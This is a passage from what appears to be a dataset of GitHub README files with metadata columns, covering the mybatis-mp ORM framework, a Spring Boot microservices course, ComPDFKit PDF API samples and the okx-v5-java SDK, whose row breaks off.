mybatis-mp/mybatis-mp,main,"# 官网文档：<strong style=""color:red"">http://mybatis-mp.cn </strong> !!!

## 喜欢的朋友加入QQ群：<font color=""red"">121908790</font> ，群里不仅可以提mybatis-mp框架问题，还可以帮你解决后端的各种问题！

##### 另外，喜欢的朋友，帮忙关注 和 star（点点小爱心）！

> <strong style=""color:red"">特别申明：禁止在非法项目中使用，否则后果自负！</strong>

<p align=""center"">
    <a target=""_blank"" href=""https://search.maven.org/search?q=mybatis-mp"">
        <img src=""https://img.shields.io/maven-central/v/cn.mybatis-mp/mybatis-mp?label=Maven%20Central"" alt=""Maven"" />
    </a>
    <a target=""_blank"" href=""https://www.apache.org/licenses/LICENSE-2.0.txt"">
		<img src=""https://img.shields.io/:license-Apache2-blue.svg"" alt=""Apache 2"" />
	</a>
    <a target=""_blank"" href='https://gitee.com/mybatis-mp/mybatis-mp'>
		<img src='https://gitee.com/mybatis-mp/mybatis-mp/badge/star.svg' alt='Gitee star'/>
	</a>
</p>

## 与众不同的 几大亮点：

#### 1：mybatis-mp - 亮点一：可自定义动态默认值

#### 2：mybatis-mp - 亮点二：支持不同数据库ID自增配置

#### 3：mybatis-mp - 亮点三：逻辑删除，可自动填充删除时间

#### 4：mybatis-mp - 亮点四：可自定义sql（sql模板）

#### 5：mybatis-mp - 亮点五：mapWithKey（把查询转成一个 map）

#### 6：mybatis-mp - 亮点 六：部分字段 新增 和 修改

#### 7：mybatis-mp - 亮点七：枚举的良好支持

#### 8：mybatis-mp - 亮点八：mybatis-xml returnType 的 ORM 映射

#### 9：mybatis-mp - 亮点九：优雅的 XML和 @Select查询 自动分页

#### 10：mybatis-mp - 亮点十：支持多层嵌套VO，自动映射以及自动select 所需列

## 特征

#### 1、很轻量,非常轻量

> 轻量级封装mybatis。
> 其他框架都比较深度修改了mybatis源码。

#### 2、高性能

> 对比其他mybatis框架，性能不差，接近最优。

#### 3、灵活方便

> 中高度实现ORM，查询API零学习成本。

#### 4、高可用

> 可应付90%的SQL需求。

#### 5、可靠，安全

> 没有过于复杂的设计，但是api却很丰富，足够使用！
> 其他框架或多或少设计的过于复杂，反而容易出现各种问题。

#### 5、优秀的分页和SQL优化能力

> 自动过滤多余的left join
> count查询 自动去除order by ，无效的left join，以及select部分替换成 select count(*) 或 select 1 后 在select count(*)
> 内置分页功能，超级牛逼！

## QQ 群

群号： 121908790 ,邀请各位大神参与补充，绝对开源，大家都可以进行代码提交，审核通过会进行master分支。
![](./doc/image/qq-group.png)

# springboot接入示例：

https://gitee.com/mybatis-mp/mybatis-mp-spring-boot-demo

# 快速开始

## 1. 基于spring-boot开发 (已引入spring、springboot 基本依赖，创建SpringApplication.run即可启动)

### 1.1 springboot2 maven 集成

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>cn.mybatis-mp</groupId>
            <artifactId>mybatis-mp-spring-boot-parent</artifactId>
            <version>1.7.3</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

```xml
<dependencies>
    <dependency>
        <groupId>cn.mybatis-mp</groupId>
        <artifactId>mybatis-mp-spring-boot-starter</artifactId>
    </dependency>
</dependencies>
```

### 1.2 springboot3 maven 集成

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>cn.mybatis-mp</groupId>
            <artifactId>mybatis-mp-spring-boot-parent</artifactId>
            <version>1.7.3-spring-boot3</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

```xml
<dependencies>
    <dependency>
        <groupId>cn.mybatis-mp</groupId>
        <artifactId>mybatis-mp-spring-boot-starter</artifactId>
    </dependency>
</dependencies>
```

#### 1.3 数据源 配置

配置spring boot配置文件

```yaml
spring.datasource.url=jdbc:mysql://localhost/test
spring.datasource.username=dbuser
spring.datasource.password=dbpass
```

或者 自己实例一个 DataSource 也可以

```java

@Configuration(proxyBeanMethods = false)
public class DatasourceConfig {

    @Bean
    public DataSource getDataSource() {
        return new EmbeddedDatabaseBuilder()
                .setName(""test_db"")
                .setType(EmbeddedDatabaseType.H2)
                .addScript(""schema.sql"")
                .build();
    }
}

```

## 开始使用

```
List<SysUser> list = QueryChain.of(sysUserMapper)
    // forSearch包含忽略null 、空字符串、对字符串进行trim去空格    
    .forSearch()
    .eq(SysUser::getId,1)
    .like(SysUser::getUserName,"" admin "")
    .list();
```

> 优雅 简单 方便 快捷

# 支持作者，赏作者一盒盒饭（^o^）

<img src=""./doc/image/alipay.png"" style=""width:500px"">",12,1,14,apache-2.0,12.0,"['http', 'returntype', 'orm', 'join', 'select', 'count', 'select', 'count', 'qq', 'http', 'maven', 'maven', 'datasource']","['http', 'select', 'count', 'maven', 'returntype']",0,0,0,"['strong', 'color', 'red', 'http', 'font', 'red', 'returntype', 'orm', 'qq', 'maven', 'maven']",30,"['red', 'maven', 'strong', 'color', 'http']",7,287.0,5.0,"[org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,4.0,1.0,3917,92.8,5.463362068965517,[],0
sivaprasadreddy/spring-boot-microservices-course,main,"# Spring Boot Microservices Course
This repository contains the source code for the [Spring Boot Microservices Course](https://www.youtube.com/playlist?list=PLuNxlOYbv61g_ytin-wgkecfWDKVCEDmB).

![Spring Boot Microservices course](docs/youtube-thumbnail.png)

We will build a BookStore application using Spring Boot, Spring Cloud, and Docker.

![BookStore Microservices Architecture](docs/bookstore-spring-microservices.png)

## Modules
* **catalog-service**: 
  This services provides REST API for managing catalog of products(books).
  
  **TechStack:** Spring Boot, Spring Data JPA, PostgreSQL

* **order-service**: 
  This service provides the REST API for managing orders and publishes order events to the message broker.

  **TechStack:** Spring Boot, Spring Security OAuth2, Keycloak, Spring Data JPA, PostgreSQL, RabbitMQ

* **notification-service**: 
  This service listens to the order events and sends notifications to the users.
  
  **TechStack:** Spring Boot, RabbitMQ

* **api-gateway**: 
  This service is an API Gateway to the internal backend services (catalog-service, order-service).

  **TechStack:** Spring Boot, Spring Cloud Gateway

* **bookstore-webapp**: 
  This is the customer facing web application where customers can browse the catalog, place orders, and view their order details. 

  **TechStack:** Spring Boot, Spring Security OAuth2, Keycloak, Thymeleaf, Alpine.js, Bootstrap

## Learning Objectives
* Building Spring Boot REST APIs
* Database Persistence using Spring Data JPA, Postgres, Flyway
* Event Driven Async Communication using RabbitMQ
* Implementing OAuth2-based Security using Spring Security and Keycloak
* Implementing API Gateway using Spring Cloud Gateway
* Implementing Resiliency using Resilience4j
* Job Scheduling with ShedLock-based distributed Locking
* Using RestClient, Declarative HTTP Interfaces to invoke other APIs
* Creating Aggregated Swagger Documentation at API Gateway
* Local Development Setup using Docker, Docker Compose and Testcontainers
* Testing using JUnit 5, RestAssured, Testcontainers, Awaitility, WireMock
* Building Web Application using Thymeleaf, Alpine.js, Bootstrap
* Monitoring & Observability using Grafana, Prometheus, Loki, Tempo (Membership)
* Kubernetes Basics (Membership)
* Deployment to Kubernetes (Membership)

## Local Development Setup
* Install Java 21. Recommend using [SDKMAN](https://sdkman.io/) for [managing Java versions](https://youtu.be/ZywEiw3EO8A).
* Install [Docker Desktop](https://www.docker.com/products/docker-desktop/)
* Install [IntelliJ IDEA](https://www.jetbrains.com/idea) or any of your favorite IDE
* Install [Postman](https://www.postman.com/) or any REST Client

## Other Learning Resources
* [SivaLabs Blog](https://sivalabs.in)
  * [Spring Boot Tutorials](https://www.sivalabs.in/spring-boot-tutorials/)
  * [Kubernetes Tutorials](https://www.sivalabs.in/getting-started-with-kubernetes/)
  * [Spring Security OAuth 2.0 Tutorials](https://www.sivalabs.in/spring-security-oauth2-tutorial-introduction/)
  * [A Pragmatic Approach to Software Design](https://www.sivalabs.in/tomato-architecture-pragmatic-approach-to-software-design/)
* [SivaLabs YouTube Channel](https://www.youtube.com/c/SivaLabs)
  * [Spring Boot Tips Series](https://www.youtube.com/playlist?list=PLuNxlOYbv61jFFX2ARQKnBgkMF6DvEEic)
  * [Spring Boot + Kubernetes Series](https://www.youtube.com/playlist?list=PLuNxlOYbv61h66_QlcjCEkVAj6RdeplJJ)
  * [Spring Boot : The Missing Guide](https://www.youtube.com/playlist?list=PLuNxlOYbv61jZL1IiciTgWezZoqEp4WXh)
  * [Java Testing Made Easy: Learn writing Unit, Integration, E2E & Performance Tests](https://www.youtube.com/playlist?list=PLuNxlOYbv61jtHHFHBOc9N7Dg5jn013ix)
",0,2,10,apache-2.0,11.0,"['spring', 'boot', 'microservices', 'course', 'repository', 'contains', 'source', 'code', 'spring', 'boot', 'microservices', 'course', 'build', 'bookstore', 'application', 'using', 'spring', 'boot', 'spring', 'cloud', 'docker', 'module', 'service', 'provides', 'rest', 'api', 'managing', 'catalog', 'product', 'book', 'techstack', 'spring', 'boot', 'spring', 'data', 'jpa', 'postgresql', 'service', 'provides', 'rest', 'api', 'managing', 'order', 'publishes', 'order', 'event', 'message', 'broker', 'techstack', 'spring', 'boot', 'spring', 'security', 'keycloak', 'spring', 'data', 'jpa', 'postgresql', 'rabbitmq', 'service', 'listens', 'order', 'event', 'sends', 'notification', 'user', 'techstack', 'spring', 'boot', 'rabbitmq', 'service', 'api', 'gateway', 'internal', 'backend', 'service', 'techstack', 'spring', 'boot', 'spring', 'cloud', 'gateway', 'customer', 'facing', 'web', 'application', 'customer', 'browse', 'catalog', 'place', 'order', 'view', 'order', 'detail', 'techstack', 'spring', 'boot', 'spring', 'security', 'keycloak', 'thymeleaf', 'bootstrap', 'learning', 'objective', 'building', 'spring', 'boot', 'rest', 'apis', 'database', 'persistence', 'using', 'spring', 'data', 'jpa', 'postgres', 'flyway', 'event', 'driven', 'async', 'communication', 'using', 'rabbitmq', 'implementing', 'security', 'using', 'spring', 'security', 'keycloak', 'implementing', 'api', 'gateway', 'using', 'spring', 'cloud', 'gateway', 'implementing', 'resiliency', 'using', 'job', 'scheduling', 'distributed', 'locking', 'using', 'restclient', 'declarative', 'http', 'interface', 'invoke', 'apis', 'creating', 'aggregated', 'swagger', 'documentation', 'api', 'gateway', 'local', 'development', 'setup', 'using', 'docker', 'docker', 'compose', 'testcontainers', 'testing', 'using', 'junit', 'restassured', 'testcontainers', 'awaitility', 'wiremock', 'building', 'web', 'application', 'using', 'thymeleaf', 'bootstrap', 'monitoring', 'observability', 'using', 'grafana', 'prometheus', 'loki', 'tempo', 'membership', 'kubernetes', 'basic', 'membership', 'deployment', 'kubernetes', 'membership', 'local', 'development', 'setup', 'install', 'java', 'recommend', 'using', 'sdkman', 'managing', 'java', 'version', 'install', 'docker', 'desktop', 'install', 'intellij', 'idea', 'favorite', 'ide', 'install', 'postman', 'rest', 'client', 'learning', 'resources', 'sivalabs', 'blog', 'spring', 'boot', 'tutorial', 'kubernetes', 'tutorial', 'spring', 'security', 'oauth', 'tutorial', 'pragmatic', 'approach', 'software', 'design', 'sivalabs', 'youtube', 'channel', 'spring', 'boot', 'tip', 'series', 'spring', 'boot', 'kubernetes', 'series', 'spring', 'boot', 'missing', 'guide', 'java', 'testing', 'made', 'easy', 'learn', 'writing', 'unit', 'integration', 'performance', 'test']","['spring', 'boot', 'using', 'service', 'api']",0,0,0,"['spring', 'boot', 'microservices', 'course', 'module', 'learn', 'objective', 'local', 'development', 'setup', 'other', 'learning', 'resource']",5,"['spring', 'boot', 'microservices', 'course', 'module']",0,6.0,6.0,"[com.diffplug.spotless:spotless-maven-plugin,io.github.git-commit-id:git-commit-id-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,1.0,3709,38.25,6.318082788671024,"['Spring Boot Microservices Course -> https://www.youtube.com/playlist?list=PLuNxlOYbv61g_ytin-wgkecfWDKVCEDmB', 'SDKMAN -> https://sdkman.io/', 'managing Java versions -> https://youtu.be/ZywEiw3EO8A', 'Docker Desktop -> https://www.docker.com/products/docker-desktop/', 'IntelliJ IDEA -> https://www.jetbrains.com/idea', 'Postman -> https://www.postman.com/', 'SivaLabs Blog -> https://sivalabs.in', 'Spring Boot Tutorials -> https://www.sivalabs.in/spring-boot-tutorials/', 'Kubernetes Tutorials -> https://www.sivalabs.in/getting-started-with-kubernetes/', 'Spring Security OAuth 2.0 Tutorials -> https://www.sivalabs.in/spring-security-oauth2-tutorial-introduction/', 'A Pragmatic Approach to Software Design -> https://www.sivalabs.in/tomato-architecture-pragmatic-approach-to-software-design/', 'SivaLabs YouTube Channel -> https://www.youtube.com/c/SivaLabs', 'Spring Boot Tips Series -> https://www.youtube.com/playlist?list=PLuNxlOYbv61jFFX2ARQKnBgkMF6DvEEic', 'Spring Boot + Kubernetes Series -> https://www.youtube.com/playlist?list=PLuNxlOYbv61h66_QlcjCEkVAj6RdeplJJ', 'Spring Boot : The Missing Guide -> https://www.youtube.com/playlist?list=PLuNxlOYbv61jZL1IiciTgWezZoqEp4WXh', 'Java Testing Made Easy: Learn writing Unit, Integration, E2E & Performance Tests -> https://www.youtube.com/playlist?list=PLuNxlOYbv61jtHHFHBOc9N7Dg5jn013ix']",16
ComPDFKit/compdfkit-api-samples,main,"## ComPDFKit PDF API

[ComPDFKit PDF API](https://api.compdf.com/) is organized around the REST standard and provides you with a simple document-upload, document-process, document-download workflow. Supporting various programming languages (such as [Java](https://api.compdf.com/api-libraries/in-java), [Python](https://api.compdf.com/api-libraries/in-python), [C#](https://api.compdf.com/api-libraries/in-net), [PHP](https://api.compdf.com/api-libraries/in-php), [Swift](https://api.compdf.com/api-libraries/in-swift), JavaScript, etc.), ComPDFKit API offers rich PDF functionalities, including conversion, document editor, data extraction, and so forth. 

Before integrating the below PDF capabilities, you can register a free [ComPDFKit API](https://api.compdf.com/signup) account to process 1,000 files per month without costs and limitations. 

| [PDF to Word](https://api.compdf.com/api-reference/pdf-to-word) | [PDF to Excel](https://api.compdf.com/api-reference/pdf-to-excel) | **[PDF to PPT](https://api.compdf.com/api-reference/pdf-to-ppt)** | [PDF to HTML](https://api.compdf.com/api-reference/pdf-to-html) |
| :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| [PDF to RTF](https://api.compdf.com/api-reference/pdf-to-rtf) | [PDF To Image](https://api.compdf.com/api-reference/pdf-to-image) | [PDF to CSV](https://api.compdf.com/api-reference/pdf-to-csv) | [PDF to TXT](https://api.compdf.com/api-reference/pdf-to-txt) |
| [Data Extraction](https://api.compdf.com/api-reference/pdf-to-json) | [PDF to Editable PDF](https://api.compdf.com/api-reference/pdf-to-editable-pdf-tool-guide) | [Image to Word](https://api.compdf.com/api-reference/image-to-word) | [Image to Excel](https://api.compdf.com/api-reference/image-to-excel) |
| [Image to PPT](https://api.compdf.com/api-reference/image-to-ppt) | [Image to HTML](https://api.compdf.com/api-reference/image-to-html) | [Image to RTF](https://api.compdf.com/api-reference/image-to-rtf) | [Image to CSV](https://api.compdf.com/api-reference/image-to-csv) |
| [Image to TXT](https://api.compdf.com/api-reference/image-to-txt) | [Word to PDF](https://api.compdf.com/api-reference/word-to-pdf) | [Excel to PDF](https://api.compdf.com/api-reference/excel-to-pdf) | [PPT to PDF](https://api.compdf.com/api-reference/ppt-to-pdf) |
| [HTML to PDF](https://api.compdf.com/api-reference/html-to-pdf) | [RTF to PDF](https://api.compdf.com/api-reference/rtf-to-pdf) | [PNG to PDF](https://api.compdf.com/api-reference/image-to-pdf) | [CSV to PDF](https://api.compdf.com/api-reference/csv-to-pdf) |
| [TXT to PDF](https://api.compdf.com/api-reference/txt-to-pdf) | [Merge PDF](https://api.compdf.com/api-reference/merge)      | [Split PDF](https://api.compdf.com/api-reference/split)      | [Rotate PDF](https://api.compdf.com/api-reference/rotate)    |
| [Delete PDF](https://api.compdf.com/api-reference/delete)    | [Insert PDF](https://api.compdf.com/api-reference/insert)    | [Extract PDF](https://api.compdf.com/api-reference/extract)  | [Compare PDF](https://api.compdf.com/api-reference/compare-documents) |
| [OCR](https://api.compdf.com/api-reference/ocr)              | [Layout Analysis](https://api.compdf.com/api-reference/layout-analysis) | [Image Sharpening Enhancement](https://api.compdf.com/api-reference/image-processing) | [Form Recognizer](https://api.compdf.com/api-reference/form-recognizer) |
| [Trim Correction](https://api.compdf.com/api-reference/trim-correction) | [Stamp Inspection](https://api.compdf.com/api-reference/stamp-inspection) | [Add Watermark](https://api.compdf.com/api-reference/watermark-guides) | [Compression PDF](https://api.compdf.com/api-reference/compress-guides) |



## Getting Started with Code Samples

This GitHub repository provides public access to code examples that demonstrate how to programmatically submit requests to the [ComPDFKit API](https://api.compdf.com/) service.

Before you begin, you may need to do some preparatory work.

- [Register](https://api.compdf.com/signup) a free ComPDFKit API account using email only.
- Obtain the project ID and its related key from the [API Keys](https://api-dashboard.compdf.com/api/keys) section of the console.
- To start requesting the ComPDFKit API, please read the comprehensive [API reference](https://api.compdf.com/api-reference/overview) for the function you need to call.



## Instructions for Running Code Demo

### Authentication

You can get **accessToken** and related verification information by sending your **publicKey** and  **SecretKey** . AccessToken will expire after **12** hours. **When calling the subsequent interface, you must carry this token in the request header**: `Authorization: Bearer {accessToken}`.

Before running each sample program, look for a comment that reads:

> `public_key_******`
>
> ` secret_key_******`

and replace `******` with your API Keys.

### Create task

A task ID is automatically generated for you based on the type of PDF tool you choose. You can provide the callback notification URL. After the task processing is completed, we will notify you of the task result through the callback interface. You can perform other operations according to the task result, such as downloading the result file.

### Upload files

Upload the original file and bind the file to the task ID. The field **parameter** is used to pass the JSON string to set the processing parameters for the file. Each file will generate automatically a unique **filekey**. 

Please note that a maximum of five files can be uploaded for a task ID and no files can be uploaded for that task after it has started.

### Execute task and get task information

After the file is uploaded, the file processing starts and the download link of the corresponding result file is obtained according to the **filekey** of each file



## API Documentation

After you've successfully sent an API Call using these examples, take a look at the [Documentation](https://api.compdf.com/api-reference/overview) for each API endpoint for a full description of parameters you can adjust to customize your solution.



## Support

ComPDFKit has a professional R&D team that produces comprehensive technical documentation and guides to help developers. Also, you can get an immediate response when reporting your problems to our support team.

- For detailed information, please visit our [API Reference](https://api.compdf.com/api-reference/overview) page.
- Stay updated with the latest improvements through our [Changelog](https://www.compdf.com/api/changelog-compdfkit-api).
- For technical assistance, please reach out to our [Technical Support](https://www.compdf.com/support).
- To get more details and an accurate quote, please contact our [Sales Team](https://api.compdf.com/contact-us).



## Related

- Convert PDF to/ from other formats using [PDF online tools](https://www.compdf.com/pdf-tools)
- [Convert PDF to Image (JPG, PNG) with ComPDFKit API and Java](https://www.compdf.com/blog/convert-pdf-to-image-in-java-compdfkit-api)
- [Convert Excel to PDF Using Java - Free PDF Converter API](https://www.compdf.com/blog/convert-excel-to-pdf-using-java-api)
- Experience [ComPDFKit Web Demo](https://www.compdf.com/webviewer/demo) on any browser",0,0,1,apache-2.0,0.0,"['compdfkit', 'pdf', 'api', 'compdfkit', 'pdf', 'api', 'organized', 'around', 'rest', 'standard', 'provides', 'simple', 'workflow', 'supporting', 'various', 'programming', 'language', 'java', 'python', 'c', 'php', 'swift', 'javascript', 'etc', 'compdfkit', 'api', 'offer', 'rich', 'pdf', 'functionality', 'including', 'conversion', 'document', 'editor', 'data', 'extraction', 'forth', 'integrating', 'pdf', 'capability', 'register', 'free', 'compdfkit', 'api', 'account', 'process', 'file', 'per', 'month', 'without', 'cost', 'limitation', 'pdf', 'word', 'pdf', 'excel', 'pdf', 'ppt', 'pdf', 'html', 'pdf', 'rtf', 'pdf', 'image', 'pdf', 'csv', 'pdf', 'txt', 'data', 'extraction', 'pdf', 'editable', 'pdf', 'image', 'word', 'image', 'excel', 'image', 'ppt', 'image', 'html', 'image', 'rtf', 'image', 'csv', 'image', 'txt', 'word', 'pdf', 'excel', 'pdf', 'ppt', 'pdf', 'html', 'pdf', 'rtf', 'pdf', 'png', 'pdf', 'csv', 'pdf', 'txt', 'pdf', 'merge', 'pdf', 'split', 'pdf', 'rotate', 'pdf', 'delete', 'pdf', 'insert', 'pdf', 'extract', 'pdf', 'compare', 'pdf', 'ocr', 'layout', 'analysis', 'image', 'sharpening', 'enhancement', 'form', 'recognizer', 'trim', 'correction', 'stamp', 'inspection', 'add', 'watermark', 'compression', 'pdf', 'getting', 'started', 'code', 'sample', 'github', 'repository', 'provides', 'public', 'access', 'code', 'example', 'demonstrate', 'programmatically', 'submit', 'request', 'compdfkit', 'api', 'service', 'begin', 'may', 'need', 'preparatory', 'work', 'register', 'free', 'compdfkit', 'api', 'account', 'using', 'email', 'obtain', 'project', 'id', 'related', 'key', 'api', 'key', 'section', 'console', 'start', 'requesting', 'compdfkit', 'api', 'please', 'read', 'comprehensive', 'api', 'reference', 'function', 'need', 'call', 'instruction', 'running', 'code', 'demo', 'authentication', 'get', 'accesstoken', 'related', 'verification', 'information', 'sending', 'publickey', 'secretkey', 'accesstoken', 'expire', 'hour', 'calling', 'subsequent', 'interface', 'must', 'carry', 'token', 'request', 'header', 'running', 'sample', 'program', 'look', 'comment', 'read', 'replace', 'api', 'key', 'create', 'task', 'task', 'id', 'automatically', 'generated', 'based', 'type', 'pdf', 'tool', 'choose', 'provide', 'callback', 'notification', 'url', 'task', 'processing', 'completed', 'notify', 'task', 'result', 'callback', 'interface', 'perform', 'operation', 'according', 'task', 'result', 'downloading', 'result', 'file', 'upload', 'file', 'upload', 'original', 'file', 'bind', 'file', 'task', 'id', 'field', 'parameter', 'used', 'pas', 'json', 'string', 'set', 'processing', 'parameter', 'file', 'file', 'generate', 'automatically', 'unique', 'filekey', 'please', 'note', 'maximum', 'five', 'file', 'uploaded', 'task', 'id', 'file', 'uploaded', 'task', 'started', 'execute', 'task', 'get', 'task', 'information', 'file', 'uploaded', 'file', 'processing', 'start', 'download', 'link', 'corresponding', 'result', 'file', 'obtained', 'according', 'filekey', 'file', 'api', 'documentation', 'successfully', 'sent', 'api', 'call', 'using', 'example', 'take', 'look', 'documentation', 'api', 'endpoint', 'full', 'description', 'parameter', 'adjust', 'customize', 'solution', 'support', 'compdfkit', 'professional', 'r', 'team', 'produce', 'comprehensive', 'technical', 'documentation', 'guide', 'help', 'developer', 'also', 'get', 'immediate', 'response', 'reporting', 'problem', 'support', 'team', 'detailed', 'information', 'please', 'visit', 'api', 'reference', 'page', 'stay', 'updated', 'latest', 'improvement', 'changelog', 'technical', 'assistance', 'please', 'reach', 'technical', 'support', 'get', 'detail', 'accurate', 'quote', 'please', 'contact', 'sale', 'team', 'related', 'convert', 'pdf', 'format', 'using', 'pdf', 'online', 'tool', 'convert', 'pdf', 'image', 'jpg', 'png', 'compdfkit', 'api', 'java', 'convert', 'excel', 'pdf', 'using', 'java', 'free', 'pdf', 'converter', 'api', 'experience', 'compdfkit', 'web', 'demo', 'browser']","['pdf', 'api', 'file', 'compdfkit', 'image']",2,2,0,"['compdfkit', 'pdf', 'api', 'get', 'start', 'code', 'sample', 'instruction', 'run', 'code', 'demo', 'authentication', 'create', 'task', 'upload', 'file', 'execute', 'task', 'get', 'task', 'information', 'api', 'documentation', 'support', 'related']",10,"['task', 'api', 'get', 'code', 'compdfkit']",0,0.0,1.0,[],0.0,1.0,0.0,7412,38.58620689655172,4.798033958891868,"['ComPDFKit PDF API -> https://api.compdf.com/', 'Java -> https://api.compdf.com/api-libraries/in-java', 'Python -> https://api.compdf.com/api-libraries/in-python', 'C# -> https://api.compdf.com/api-libraries/in-net', 'PHP -> https://api.compdf.com/api-libraries/in-php', 'Swift -> https://api.compdf.com/api-libraries/in-swift', 'ComPDFKit API -> https://api.compdf.com/signup', 'PDF to Word -> https://api.compdf.com/api-reference/pdf-to-word', 'PDF to Excel -> https://api.compdf.com/api-reference/pdf-to-excel', 'PDF to PPT -> https://api.compdf.com/api-reference/pdf-to-ppt', 'PDF to HTML -> https://api.compdf.com/api-reference/pdf-to-html', 'PDF to RTF -> https://api.compdf.com/api-reference/pdf-to-rtf', 'PDF To Image -> https://api.compdf.com/api-reference/pdf-to-image', 'PDF to CSV -> https://api.compdf.com/api-reference/pdf-to-csv', 'PDF to TXT -> https://api.compdf.com/api-reference/pdf-to-txt', 'Data Extraction -> https://api.compdf.com/api-reference/pdf-to-json', 'PDF to Editable PDF -> https://api.compdf.com/api-reference/pdf-to-editable-pdf-tool-guide', 'Image to Word -> https://api.compdf.com/api-reference/image-to-word', 'Image to Excel -> https://api.compdf.com/api-reference/image-to-excel', 'Image to PPT -> https://api.compdf.com/api-reference/image-to-ppt', 'Image to HTML -> https://api.compdf.com/api-reference/image-to-html', 'Image to RTF -> https://api.compdf.com/api-reference/image-to-rtf', 'Image to CSV -> https://api.compdf.com/api-reference/image-to-csv', 'Image to TXT -> https://api.compdf.com/api-reference/image-to-txt', 'Word to PDF -> https://api.compdf.com/api-reference/word-to-pdf', 'Excel to PDF -> https://api.compdf.com/api-reference/excel-to-pdf', 'PPT to PDF -> https://api.compdf.com/api-reference/ppt-to-pdf', 'HTML to PDF -> https://api.compdf.com/api-reference/html-to-pdf', 'RTF to PDF -> https://api.compdf.com/api-reference/rtf-to-pdf', 'PNG to PDF -> https://api.compdf.com/api-reference/image-to-pdf', 'CSV to PDF -> https://api.compdf.com/api-reference/csv-to-pdf', 'TXT to PDF -> https://api.compdf.com/api-reference/txt-to-pdf', 'Merge PDF -> https://api.compdf.com/api-reference/merge', 'Split PDF -> https://api.compdf.com/api-reference/split', 'Rotate PDF -> https://api.compdf.com/api-reference/rotate', 'Delete PDF -> https://api.compdf.com/api-reference/delete', 'Insert PDF -> https://api.compdf.com/api-reference/insert', 'Extract PDF -> https://api.compdf.com/api-reference/extract', 'Compare PDF -> https://api.compdf.com/api-reference/compare-documents', 'OCR -> https://api.compdf.com/api-reference/ocr', 'Layout Analysis -> https://api.compdf.com/api-reference/layout-analysis', 'Image Sharpening Enhancement -> https://api.compdf.com/api-reference/image-processing', 'Form Recognizer -> https://api.compdf.com/api-reference/form-recognizer', 'Trim Correction -> https://api.compdf.com/api-reference/trim-correction', 'Stamp Inspection -> https://api.compdf.com/api-reference/stamp-inspection', 'Add Watermark -> https://api.compdf.com/api-reference/watermark-guides', 'Compression PDF -> https://api.compdf.com/api-reference/compress-guides', 'ComPDFKit API -> https://api.compdf.com/', 'Register -> https://api.compdf.com/signup', 'API Keys -> https://api-dashboard.compdf.com/api/keys', 'API reference -> https://api.compdf.com/api-reference/overview', 'Documentation -> https://api.compdf.com/api-reference/overview', 'API Reference -> https://api.compdf.com/api-reference/overview', 'Changelog -> https://www.compdf.com/api/changelog-compdfkit-api', 'Technical Support -> https://www.compdf.com/support', 'Sales Team -> https://api.compdf.com/contact-us', 'PDF online tools -> https://www.compdf.com/pdf-tools', 'Convert PDF to Image (JPG, PNG) with ComPDFKit API and Java -> https://www.compdf.com/blog/convert-pdf-to-image-in-java-compdfkit-api', 'Convert Excel to PDF Using Java - Free PDF Converter API -> https://www.compdf.com/blog/convert-excel-to-pdf-using-java-api', 'ComPDFKit Web Demo -> https://www.compdf.com/webviewer/demo']",60
forestwanglin/okx-v5-java,main,"# okx-v5-java
[![GitHub version](https://img.shields.io/static/v1?label=version&message=v0.5.2024072701&color=blue)](https://github.com/forestwanglin/okx-v5-java)
[![License](https://img.shields.io/static/v1?label=license&message=MIT&color=orange)](https://github.com/forestwanglin/okx-v5-java/blob/main/LICENSE)

OKX v5 SDK for JAVA. 

I am going to implement all APIs on the [official api document](https://www.okx.com/docs-v5/en/#overview).

## SDK API STATUS
- ### Rest API
  - [Trading Account](https://www.okx.com/docs-v5/en/#trading-account-rest-api)
    - [x] [Get Balance](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-balance)
    - [ ] [Get positions](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-positions)
    - [ ] [Get positions history](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-positions-history)
    - [ ] [Get account and position risk](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-account-and-position-risk)
    - [ ] [Get bills details (last 7 days)](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-bills-details-last-7-days)
    - [ ] [Get bills details (last 3 months)](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-bills-details-last-3-months)
    - [ ] [Get account configuration](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-account-configuration)
    - [ ] [Set position mode](https://www.okx.com/docs-v5/en/#trading-account-rest-api-set-position-mode)
    - [ ] [Set leverage](https://www.okx.com/docs-v5/en/#trading-account-rest-api-set-leverage)
    - [ ] [Get maximum buy/sell amount or open amount](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-maximum-buy-sell-amount-or-open-amount)
    - [ ] ...
  - [Order Book Trading](https://www.okx.com/docs-v5/en/#order-book-trading)
    - [Trade](https://www.okx.com/docs-v5/en/#order-book-trading-trade)
      - [x] [POST / Place order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-place-order)
      - [ ] [POST / Place multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-place-multiple-orders)
      - [x] [POST / Cancel order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-cancel-order)
      - [ ] [POST / Cancel multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-cancel-multiple-orders)
      - [ ] [POST / Amend order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-amend-order)
      - [ ] [POST / Amend multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-amend-multiple-orders)
      - [ ] [POST / Close positions](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-close-positions)
      - [ ] ...
    - [Grid Trading](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading)
